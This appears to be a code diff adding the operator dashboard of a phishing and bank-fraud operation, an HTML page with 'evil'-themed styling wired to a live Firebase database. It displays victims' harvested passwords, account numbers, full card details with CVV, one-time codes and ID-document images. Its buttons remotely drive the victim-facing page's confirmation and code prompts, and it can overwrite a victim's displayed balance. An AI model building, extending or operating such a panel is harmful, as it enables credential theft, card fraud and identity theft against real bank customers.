@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>My Life Entries</title>
+  <style>
+    /* General Evil Theme */
+    body {
+      font-family: "Courier New", monospace;
+      background: radial-gradient(circle at center, #000 70%, #111);
+      color: #e0e0e0;
+      padding: 20px;
+      text-shadow: 0 0 5px rgba(255,0,0,0.6);
+    }
+
+    h2 {
+      color: #ff0000;
+      text-align: center;
+      font-size: 26px;
+      text-shadow: 0 0 20px #ff0000, 0 0 40px #990000;
+      margin-bottom: 20px;
+    }
+
+    #currentTime {
+      font-size: 18px;
+      font-weight: bold;
+      margin-bottom: 15px;
+      color: #ff4444;
+      text-shadow: 0 0 15px red, 0 0 25px black;
+    }
+
+    input#accInput {
+      width: 100%;
+      padding: 10px;
+      border: 2px solid #660000;
+      border-radius: 8px;
+      background: #111;
+      color: #ff3333;
+      font-size: 16px;
+      margin-bottom: 20px;
+      text-align: center;
+      outline: none;
+      box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
+    }
+    input#accInput::placeholder {
+      color: #660000;
+    }
+
+    /* Evil Cards */
+    .card {
+      background: linear-gradient(145deg, #1a0000, #0d0000);
+      border: 1px solid #330000;
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 20px;
+      box-shadow: 0px 0px 20px rgba(255,0,0,0.5);
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+    .card:hover {
+      transform: scale(1.02);
+      box-shadow: 0px 0px 30px rgba(255,0,0,0.8);
+    }
+
+    .card h3 {
+      margin: 0 0 10px 0;
+      font-size: 18px;
+      font-weight: bold;
+      color: #ff0000;
+      text-shadow: 0 0 10px #ff0000, 0 0 20px #660000;
+    }
+
+    .card p {
+      margin: 5px 0;
+      font-size: 14px;
+      cursor: pointer;
+      color: #ddd;
+      transition: color 0.3s ease;
+    }
+    .card p:hover {
+      color: #ff4444;
+      text-shadow: 0 0 10px #ff0000;
+    }
+
+    /* Online/Offline Glow */
+    .status-online {
+      color: #00ff00;
+      text-shadow: 0 0 10px #00ff00, 0 0 20px #004400;
+      font-weight: bold;
+    }
+    .status-offline {
+      color: #ff0000;
+      text-shadow: 0 0 10px #ff0000, 0 0 20px #440000;
+      font-weight: bold;
+    }
+
+    /* Flash Animation for balance */
+    .flash {
+      background: #330000;
+      animation: evilFlash 1s ease;
+    }
+    @keyframes evilFlash {
+      0% { background: #660000; }
+      50% { background: #ff0000; color: #fff; text-shadow: 0 0 10px #ff0000; }
+      100% { background: #330000; }
+    }
+
+    /* Evil Buttons */
+    .card button {
+      margin: 6px 6px 0 0;
+      padding: 8px 14px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 13px;
+      text-transform: uppercase;
+      font-weight: bold;
+      transition: all 0.3s ease;
+    }
+
+    .btn-confirm { background: #111; color: #0f0; border: 1px solid #0f0; }
+    .btn-confirm:hover { background: #0f0; color: #000; box-shadow: 0 0 15px #0f0; }
+
+    .btn-no { background: #111; color: #f00; border: 1px solid #f00; }
+    .btn-no:hover { background: #f00; color: #000; box-shadow: 0 0 15px #f00; }
+
+    .btn-show { background: #111; color: #ff0; border: 1px solid #ff0; }
+    .btn-show:hover { background: #ff0; color: #000; box-shadow: 0 0 15px #ff0; }
+
+    .btn-images { background: #111; color: #aaa; border: 1px solid #aaa; }
+    .btn-images:hover { background: #aaa; color: #000; box-shadow: 0 0 15px #aaa; }
+
+    /* Evil Modal */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0; top: 13%;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.95);
+      justify-content: center;
+      align-items: center;
+      animation: modalAppear 0.4s ease;
+    }
+    @keyframes modalAppear {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    .modal-content {
+      position: relative;
+      max-width: 90%;
+      max-height: 90%;
+      border: 2px solid #ff0000;
+      border-radius: 12px;
+      box-shadow: 0 0 30px #ff0000;
+      background: #000;
+      padding: 10px;
+    }
+
+    .modal img {
+      width: 100%;
+      max-height: 80vh;
+      object-fit: contain;
+      border-radius: 10px;
+      box-shadow: 0 0 20px #ff0000;
+    }
+
+    .close-btn {
+      position: absolute;
+      top: 10px; right: 10px;
+      background: #ff0000;
+      color: white;
+      border: none;
+      padding: 6px 12px;
+      cursor: pointer;
+      border-radius: 5px;
+      font-weight: bold;
+      text-transform: uppercase;
+      transition: all 0.3s ease;
+    }
+    .close-btn:hover {
+      background: #660000;
+      box-shadow: 0 0 15px #ff0000;
+    }
+ /* Special glowing blue for Page and Code values */
+.card p[data-label="Page"],
+.card p[data-label="Code"] {
+  font-weight: bold;
+  color: #00ccff;
+  text-shadow: 0 0 8px #00ccff, 0 0 16px #0099cc;
+}
+ 
+  </style>
+</head>
+
+<body>
+ <div style="position: fixed; height: 180px; top: 0; left: 0; padding: 10px 10px 10px 19px; background: radial-gradient(circle at center, #000 70%, #111); z-index: 99999999999;">
+ 
+  <h2>Tk DEV💣</h2>
+ <div id="quote">Loading motivation...</div>
+<div style="display: flex;">
+  <div id="currentTime">Loading Nigeria time...</div>   <input id="accInput" type="number" placeholder="Enter 10-digit accno">
+ </div>
+  </div>
+  <div style="margin-top: 59%;"id="entries"></div>
+
+  <!-- Modal for images -->
+  <div id="imageModal" class="modal">
+    <div class="modal-content">
+      <button class="close-btn" onclick="closeModal()">Close</button>
+      <img id="modalImage" src="" alt="Image Preview">
+    </div>
+  </div>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
+    import { getDatabase, ref, onValue, get, update } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";
+
+    const firebaseConfig = {
+      databaseURL: "https://tuak-9f342-default-rtdb.firebaseio.com/"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    function formatNigeriaTime() {
+      let now = new Date(new Date().toLocaleString("en-US", { timeZone: "Africa/Lagos" }));
+      let y = now.getFullYear();
+      let m = String(now.getMonth() + 1).padStart(2, "0");
+      let d = String(now.getDate()).padStart(2, "0");
+      let hh = String(now.getHours()).padStart(2, "0");
+      let mm = String(now.getMinutes()).padStart(2, "0");
+      let ss = String(now.getSeconds()).padStart(2, "0");
+      return `${y}-${m}-${d} ${hh}:${mm}:${ss}`;
+    }
+
+    function parseNigeriaTime(str) {
+      let parts = str.split(/[- :]/);
+      return new Date(parts[0], parts[1]-1, parts[2], parts[3], parts[4], parts[5]);
+    }
+
+    let allEntries = [];
+    let countdowns = {};
+
+    function safeId(id) {
+      return id.replace(/[^a-zA-Z0-9_-]/g, "_");
+    }
+
+    // Utility: render <p> only if value exists
+   function renderField(label, value) {
+  if (!value) return "";
+  return `<p data-label="${label}" data-value="${value}"><b>${label}:</b> ${value}</p>`;
+}
+    function renderEntries(data) {
+      allEntries = [];
+      for (let key in data) {
+        let entry = data[key];
+        entry.id = key;
+        entry.dateObj = entry.time ? parseNigeriaTime(entry.time) : new Date(0);
+        entry.safeId = safeId(entry.id);
+        allEntries.push(entry);
+      }
+      allEntries.sort((a, b) => b.dateObj - a.dateObj);
+
+      const container = document.getElementById("entries");
+      container.innerHTML = "";
+
+      allEntries.forEach(entry => {
+        let card = document.createElement("div");
+        card.className = "card";
+        card.id = "card-" + entry.safeId;
+
+        let html = `
+          <h3>${entry.id} - <span class="status">...</span></h3>
+          ${renderField("Page", entry.online)}
+          ${renderField("Code", entry.code)}
+          ${renderField("Balance", entry.balance)}
+          ${renderField("Country", entry.country)}
+          ${renderField("ShowConfirm", entry.confirm)}
+          ${renderField("CodePage", entry.showcode)}
+          ${renderField("Password", entry.password)}
+          ${renderField("FullName", entry.fullname)}
+          ${renderField("Accno", entry.accno)}
+          ${renderField("Time", entry.time)}
+          ${renderField("CardName", entry.cardName)}
+          ${renderField("CardNumber", entry.cardNumber)}
+          ${renderField("CardCountry", entry.cardCountry)}
+          ${renderField("CardMonth", entry.cardMonth)}
+          ${renderField("CardYear", entry.cardYear)}
+          ${renderField("Cvv", entry.cardCvv)}
+          ${renderField("ImageF", entry.imageUrl)}
+          ${renderField("ImageB", entry.imageUrl1)}
+          <div class="buttons">
+            <button class="btn-confirm" onclick="confirmYes('${entry.id}')">Confirm (Yes)</button>
+            <button class="btn-no" onclick="confirmNo('${entry.id}')">Confirm (No)</button>
+            <button class="btn-show" onclick="setShow('${entry.id}')">ShoCode</button>
+            
+             <button class="btn-no" onclick="setDel('${entry.id}')">DelCode</button>
+            
+            
+            <button class="btn-images" onclick="openModal('${entry.imageUrl||""}','${entry.imageUrl1||""}')">View Images</button>
+          </div>
+        `;
+        card.innerHTML = html;
+        container.appendChild(card);
+
+        // Add copy-to-clipboard for each <p>
+        card.querySelectorAll("p").forEach(p => {
+          p.addEventListener("click", () => {
+            const val = p.getAttribute("data-value");
+            if (val) {
+              navigator.clipboard.writeText(val).then(() => {
+                
+              });
+            }
+          });
+        });
+      });
+    }
+
+    function tick() {
+  let nigeriaTimeStr = formatNigeriaTime();
+  document.getElementById("currentTime").textContent = "Nigeria Time: " + nigeriaTimeStr;
+  let nigeriaNow = parseNigeriaTime(nigeriaTimeStr);
+
+  allEntries.forEach(entry => {
+    const statusEl = document.querySelector(`#card-${entry.safeId} .status`);
+    if (statusEl) {
+      let diff = (nigeriaNow - entry.dateObj) / 1000; // seconds passed since entry.time
+
+      // ✅ Only go Offline if more than 60s old
+      if (diff <= 5) {
+        if (statusEl.textContent !== "Online") {
+          statusEl.textContent = "Online";
+          statusEl.className = "status status-online";
+        }
+      } else {
+        if (statusEl.textContent !== "Offline") {
+          statusEl.textContent = "Offline";
+          statusEl.className = "status status-offline";
+        }
+      }
+    }
+  });
+}
+    setInterval(tick, 1000);
+
+    // Firebase live listener
+    const myLifeRef = ref(db, "mylife");
+    onValue(myLifeRef, (snapshot) => {
+      if (snapshot.exists()) {
+        renderEntries(snapshot.val());
+      } else {
+        document.getElementById("entries").innerHTML = "<p>No data available</p>";
+      }
+    });
+
+    
+    // --- Button functions ---
+    window.confirmYes = function(id) {
+      const entryRef = ref(db, "mylife/" + id);
+      update(entryRef, { confirm: "yes" });
+      let countdown = 60;
+      const card = document.getElementById("card-" + safeId(id));
+      let btn = card.querySelector(".btn-confirm");
+      btn.disabled = true;
+      btn.textContent = "Confirm (Yes) - " + countdown;
+
+      countdowns[id] = setInterval(() => {
+        countdown--;
+        btn.textContent = "Confirm (Yes) - " + countdown;
+        if (countdown <= 0) {
+          clearInterval(countdowns[id]);
+          update(entryRef, { confirm: "noo" });
+          btn.disabled = false;
+          btn.textContent = "Confirm (Yes)";
+        }
+      }, 1000);
+    };
+
+    window.confirmNo = function(id) {
+      const entryRef = ref(db, "mylife/" + id);
+      update(entryRef, { confirm: "noo" });
+    };
+
+    window.setShow = function(id) {
+      const entryRef = ref(db, "mylife/" + id);
+      update(entryRef, { showcode: "yes" });
+    };
+window.setDel = function(id) {
+      const entryRef = ref(db, "mylife/" + id);
+      update(entryRef, { showcode: "noo" });
+    };
+    // --- Modal functions ---
+    let currentImages = [];
+    let currentIndex = 0;
+
+    window.openModal = function(img1, img2) {
+      currentImages = [];
+      if (img1) currentImages.push(img1);
+      if (img2) currentImages.push(img2);
+      currentIndex = 0;
+      if (currentImages.length > 0) {
+        document.getElementById("modalImage").src = currentImages[currentIndex];
+        document.getElementById("imageModal").style.display = "flex";
+      }
+    };
+
+    window.closeModal = function() {
+      document.getElementById("imageModal").style.display = "none";
+    };
+
+    // swipe gestures
+    const modal = document.getElementById("imageModal");
+    let startX = 0;
+    modal.addEventListener("touchstart", e => { startX = e.touches[0].clientX; });
+    modal.addEventListener("touchend", e => {
+      let endX = e.changedTouches[0].clientX;
+      if (endX < startX - 50) { // swipe left
+        if (currentIndex < currentImages.length - 1) {
+          currentIndex++;
+          document.getElementById("modalImage").src = currentImages[currentIndex];
+        }
+      }
+      if (endX > startX + 50) { // swipe right
+        if (currentIndex > 0) {
+          currentIndex--;
+          document.getElementById("modalImage").src = currentImages[currentIndex];
+        }
+      }
+    });
+    // close on outside click
+    modal.addEventListener("click", e => {
+      if (e.target === modal) {
+        closeModal();
+      }
+    });
+  
+  // Input listener  
+    const accInput = document.getElementById("accInput");  
+  
+    accInput.addEventListener("input", async (event) => {  
+      const code = event.target.value.trim();  
+      console.log("Entered code:", code);  
+  
+      if (code.length === 10 && !isNaN(code)) {  
+        try {  
+          const snapshot = await get(ref(db, "mylife"));  
+          if (snapshot.exists()) {  
+            const data = snapshot.val();  
+            let found = false;  
+  
+            console.log("🔎 Checking all accno values...");  
+            for (const entryKey in data) {  
+              const entryData = data[entryKey];  
+              console.log("Entry:", entryKey, "accno:", entryData.accno);  
+  
+              // ✅ Compare as strings  
+              if (entryData.accno && String(entryData.accno) === String(code)) {  
+                found = true;  
+                console.log("✅ Match found:", entryKey, "accno:", entryData.accno);  
+  
+                const entryRef = ref(db, `mylife/${entryKey}`);  
+                await update(entryRef, { balance: "1,152.00" });  
+                console.log("💰 Balance updated successfully for", entryKey);  
+  
+                // 🔥 Instantly update UI  
+                const cardEl = document.getElementById("card-" + safeId(entryKey));  
+                if (cardEl) {  
+     const balanceEl = cardEl.querySelector('p[data-label="Balance"]');
+if (balanceEl) {
+  balanceEl.innerHTML = `<b>Balance:</b> 1,152.00`;
+  balanceEl.classList.add("flash");
+  setTimeout(() => balanceEl.classList.remove("flash"), 1000);
+}            
+                }  
+  
+                break;  
+              }  
+            }  
+  
+            if (!found) {  
+              console.log("❌ No match found for accno:", code);  
+            }  
+          } else {  
+            console.log("⚠️ No entries found in the database.");  
+          }  
+        } catch (error) {  
+          console.error("Error checking accno:", error);  
+        }  
+      }  
+    });  
+  setInterval(() => {
+  const quotes = [
+      "Believe in yourself and all that you are.",
+      "Success is not final, failure is not fatal: It is the courage to continue that counts.",
+      "Don't watch the clock; do what it does. Keep going.",
+      "Great things never come from comfort zones.",
+      "Push yourself, because no one else is going to do it for you.",
+      "Dream it. Wish it. Do it.",
+      "Your limitation—it’s only your imagination.",
+      "Sometimes later becomes never. Do it now.",
+      "Little things make big days.",
+      "It’s going to be hard, but hard does not mean impossible.",
+      "Don’t wait for opportunity. Create it.",
+      "Success doesn’t just find you. You have to go out and get it.",
+      "The harder you work for something, the greater you’ll feel when you achieve it.",
+      "Dream bigger. Do bigger.",
+      "Don’t stop when you’re tired. Stop when you’re done.",
+      "Wake up with determination. Go to bed with satisfaction.",
+      "Do something today that your future self will thank you for.",
+      "Little progress is still progress.",
+      "It’s not about perfect. It’s about effort.",
+      "Sometimes we’re tested not to show our weaknesses, but to discover our strengths.",
+      "The key to success is to focus on goals, not obstacles.",
+      "Dreams don’t work unless you do.",
+      "Don’t limit your challenges. Challenge your limits.",
+      "Believe you can and you're halfway there.",
+      "The secret of getting ahead is getting started.",
+      "Don’t wait. The time will never be just right.",
+      "If it doesn’t challenge you, it won’t change you.",
+      "Difficult roads often lead to beautiful destinations.",
+      "It always seems impossible until it’s done.",
+      "Start where you are. Use what you have. Do what you can.",
+      "Great things take time.",
+      "Stay positive, work hard, make it happen.",
+      "Focus on being productive instead of busy.",
+      "The only limit to our realization of tomorrow is our doubts of today.",
+      "Don’t watch the clock; do what it does. Keep going.",
+      "Motivation gets you started. Habit keeps you going.",
+      "The way to get started is to quit talking and begin doing.",
+      "You are capable of more than you know.",
+      "Your only limit is your mind.",
+      "Push yourself because no one else is going to do it for you.",
+      "Success is what happens after you have survived all your mistakes.",
+      "Opportunities don’t happen. You create them.",
+      "Sometimes the smallest step in the right direction ends up being the biggest step of your life.",
+      "Don’t be afraid to give up the good to go for the great.",
+      "Act as if what you do makes a difference. It does.",
+      "Success is not in what you have, but who you are.",
+      "Hustle in silence and let your success make the noise.",
+      "Do not wait to strike till the iron is hot; but make it hot by striking.",
+      "Success is walking from failure to failure with no loss of enthusiasm.",
+      "Don’t let yesterday take up too much of today.",
+      "The only way to achieve the impossible is to believe it is possible.",
+      "You don’t have to be great to start, but you have to start to be great.",
+      "Strive for progress, not perfection.",
+      "Success is the sum of small efforts, repeated day in and day out.",
+      "The future depends on what you do today.",
+      "Don’t limit yourself. Many people limit themselves to what they think they can do.",
+      "A year from now you may wish you had started today.",
+      "Great things never come from comfort zones.",
+      "Motivation is what gets you started. Habit is what keeps you going.",
+      "Believe in yourself, take on your challenges, dig deep within yourself to conquer fears.",
+      "Push yourself, because no one else is going to do it for you.",
+      "Success is no accident. It is hard work, perseverance, learning, studying, sacrifice and most of all, love of what you are doing.",
+      "Work until you no longer have to introduce yourself.",
+      "Success usually comes to those who are too busy to be looking for it.",
+      "Don’t be pushed around by the fears in your mind. Be led by the dreams in your heart.",
+      "Do something today that your future self will thank you for.",
+      "Little things make big days.",
+      "Don’t wait for opportunity. Create it.",
+      "The harder you work for something, the greater you’ll feel when you achieve it.",
+      "Dream bigger. Do bigger.",
+      "Don’t stop when you’re tired. Stop when you’re done.",
+      "Wake up with determination. Go to bed with satisfaction.",
+      "Do what you can with all you have, wherever you are.",
+        "You are braver than you believe, stronger than you seem, and smarter than you think.",
+      "Success is not final, failure is not fatal: It is the courage to continue that counts.",
+      "Hardships often prepare ordinary people for an extraordinary destiny.",
+      "Your time is limited, so don’t waste it living someone else’s life.",
+      "Believe in yourself and all that you are. Know that there is something inside you that is greater than any obstacle.",
+      "Keep your eyes on the stars, and your feet on the ground.",
+      "Don’t be afraid to give up the good to go for the great.",
+      "I find that the harder I work, the more luck I seem to have.",
+      "The best way to get started is to quit talking and begin doing.",
+      "The only limit to our realization of tomorrow will be our doubts of today.",
+      "It does not matter how slowly you go as long as you do not stop.",
+      "All our dreams can come true if we have the courage to pursue them.",
+      "Everything you’ve ever wanted is on the other side of fear.",
+      "Success is the sum of small efforts, repeated day in and day out.",
+      "Opportunities don't happen. You create them.",
+      "Great things never come from comfort zones.",
+      "Do what you love, love what you do, and with all your heart give yourself to it.",
+      "Start where you are. Use what you have. Do what you can.",
+      "Be not afraid of life. Believe that life is worth living, and your belief will help create the fact.",
+      "Push yourself, because no one else is going to do it for you.",
+      "Act as if what you do makes a difference. It does.",
+      "The secret to getting ahead is getting started.",
+      "Don't limit your challenges. Challenge your limits.",
+      "Dream it. Wish it. Do it."
+    ];
+
+    // Random quote on every refresh
+    const randomQuote = quotes[Math.floor(Math.random() * quotes.length)];
+    document.getElementById("quote").textContent = randomQuote;
+ }, 6800);
+       
+  </script>
+</body>
+</html>
+
+
+
